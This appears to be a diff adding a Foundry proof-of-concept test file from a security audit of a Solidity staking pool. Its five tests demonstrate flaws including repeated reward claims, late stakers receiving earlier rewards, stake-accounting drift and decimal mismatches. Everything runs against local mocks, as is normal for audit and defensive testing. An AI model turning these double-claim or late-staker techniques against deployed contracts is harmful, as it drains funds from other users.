@@ -1,0 +1,94 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {Test, console} from "forge-std/Test.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {StakingPool} from "../src/StakingPool.sol";
+import {TrustScore} from "../src/TrustScore.sol";
+import {MockAUSD} from "./mocks/MockAUSD.sol";
+
+contract Token6 is ERC20 {
+    constructor() ERC20("AUSD6", "AUSD6") {}
+    function decimals() public pure override returns (uint8) { return 6; }
+    function mint(address to, uint256 a) external { _mint(to, a); }
+}
+
+contract AuditPoC is Test {
+    MockAUSD ausd;
+    StakingPool pool;
+    address alice = makeAddr("alice");
+    address bob = makeAddr("bob");
+    address attacker = makeAddr("attacker");
+
+    function setUp() public {
+        ausd = new MockAUSD();
+        pool = new StakingPool(address(ausd), address(this), address(0), 1 ether);
+        ausd.mint(address(pool), 1_000_000 ether);
+        address[3] memory us = [alice, bob, attacker];
+        for (uint256 i; i < 3; i++) {
+            ausd.mint(us[i], 1000 ether);
+            vm.prank(us[i]);
+            ausd.approve(address(pool), type(uint256).max);
+        }
+    }
+
+    // H1: claimReward can be called repeatedly; each call pays the full cumulative amount again
+    function test_PoC_DoubleClaim() public {
+        vm.prank(alice); pool.stake(100 ether);
+        vm.warp(block.timestamp + 100);
+        uint256 b0 = ausd.balanceOf(alice);
+        vm.startPrank(alice);
+        pool.claimReward();
+        pool.claimReward();
+        pool.claimReward();
+        vm.stopPrank();
+        console.log("alice paid (AUSD) for 100s @ 1 AUSD/s, 3 claims:", (ausd.balanceOf(alice) - b0) / 1 ether);
+    }
+
+    // H2: late staker is credited with rewards from before they staked
+    function test_PoC_LateStakerGetsHistory() public {
+        vm.prank(alice); pool.stake(100 ether);
+        vm.warp(block.timestamp + 1000);
+        vm.prank(attacker); pool.stake(100 ether);
+        vm.prank(attacker); pool.claimReward(); // first claim only syncs? see below
+        uint256 b0 = ausd.balanceOf(attacker);
+        vm.prank(attacker); pool.claimReward();
+        console.log("attacker second claim, 0s after staking (AUSD):", (ausd.balanceOf(attacker) - b0) / 1 ether);
+    }
+
+    // H3: _totalEffectiveStake drifts when a score changes between stake and unstake
+    function test_PoC_EffectiveStakeDrift() public {
+        TrustScore ts = new TrustScore(address(this), address(0), address(this)); // this = trusted "pool"
+        StakingPool p2 = new StakingPool(address(ausd), address(this), address(ts), 1 ether);
+        ausd.mint(address(p2), 1_000_000 ether);
+        vm.prank(alice); ausd.approve(address(p2), type(uint256).max);
+        vm.prank(bob); ausd.approve(address(p2), type(uint256).max);
+        vm.prank(alice); p2.stake(100 ether);
+        vm.prank(bob); p2.stake(100 ether);
+        console.log("total effective before:", p2.getTotalStaked() / 1 ether);
+        ts.recordStakingFactor(alice, 10_000); // alice's score rises; 25% weight -> 2500
+        vm.warp(block.timestamp + 7 days);
+        vm.prank(alice); p2.unstake(100 ether);
+        console.log("total effective after alice exits (bob still has 100):", p2.getTotalStaked() / 1 ether);
+    }
+
+    // H4: MIN_STAKE = 1e18 assumes 18 decimals; AUSD is expected to be 6
+    function test_PoC_MinStakeWith6Decimals() public {
+        Token6 t = new Token6();
+        StakingPool p3 = new StakingPool(address(t), address(this), address(0), 0);
+        t.mint(alice, 1_000_000e6);
+        vm.startPrank(alice);
+        t.approve(address(p3), type(uint256).max);
+        vm.expectRevert();
+        p3.stake(1_000_000e6); // 1,000,000 AUSD
+        vm.stopPrank();
+        console.log("1,000,000 AUSD (6dp) stake reverted");
+    }
+
+    // H5: score is never updated by registry/pool; dust stake maxes the staking factor if it were
+    function test_PoC_DustStakeMaxesFactor() public {
+        TrustScore ts = new TrustScore(address(this), address(0), address(this));
+        ts.recordStakingFactor(alice, 10_000); // 10_000 base units
+        console.log("score from 10_000 wei of stake (bps):", ts.getScore(alice));
+    }
+}
